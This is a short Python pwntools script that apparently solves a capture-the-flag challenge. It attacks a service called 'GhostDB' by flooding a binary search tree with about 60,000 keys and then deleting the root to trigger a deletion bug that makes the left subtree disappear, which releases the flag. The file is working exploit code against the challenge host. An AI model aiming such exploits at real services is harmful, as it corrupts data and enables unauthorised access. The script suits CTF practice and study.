import json
from pwn import *

# Connection configuration
host = 'instance.penguin.0ops.sjtu.cn'
port = 18341

def solve():
    # Connect
    r = remote(host, port)
    r.recvuntil(b'Choose an action: ')

    print("[*] Phase 1: Preparing ultra-small Payload...")
    
    # Strategy: Create BST tree with Root as 59000.
    # Left Subtree will contain 59000 nodes (0 -> 58999).
    # When deleting Root, if BST has bug, entire left subtree could be 'detached' (disappear).
    
    root_key = "59000"
    payload_list = []
    
    # 1. Insert Root FIRST so it sits on top of tree
    payload_list.append({"pk": root_key})
    
    # 2. Insert left subtree nodes (0 -> 58999)
    # Only use 'pk' field to save space
    for i in range(59000):
        payload_list.append({"pk": str(i)})
        
    # 3. Insert remaining right subtree nodes (59001 -> 60000)
    for i in range(59001, 60000):
        payload_list.append({"pk": str(i)})

    # Create JSON string
    json_payload = json.dumps(payload_list).encode()
    print(f"[+] Payload Size: {len(json_payload)} bytes (Max allowed: 2,000,000)")

    if len(json_payload) > 2000000:
        print("[-] Warning: Payload still too large!")
        return

    # Send Bulk Insert command
    print("[*] Sending Bulk Insert...")
    r.sendline(b'2')      # Insert
    r.recvuntil(b'(y/[n]): ')
    r.sendline(b'y')      # Bulk mode
    r.recvuntil(b'rows to insert: ')
    r.sendline(json_payload)
    
    # Check Insert result
    res = r.recvuntil(b'row(s) inserted.').decode()
    print(f"[+] Insert status: {res}")

    # Phase 2: Trigger GhostDB bug
    print("[*] Phase 2: Deleting Root to trigger bug...")
    r.recvuntil(b'Choose an action: ')
    r.sendline(b'3')      # Delete
    r.recvuntil(b'key to delete: ')
    r.sendline(root_key.encode())
    
    del_res = r.recvline().decode()
    print(f"[+] Delete status: {del_res.strip()}")
    
    # Phase 3: Get Flag
    print("[*] Phase 3: Checking Flag...")
    r.recvuntil(b'Choose an action: ')
    r.sendline(b'4')      # Claim Flag
    
    flag = r.recvline().decode()
    print(f"\n[WIN] RESULT: {flag}")
    
    r.close()

if __name__ == "__main__":
    solve()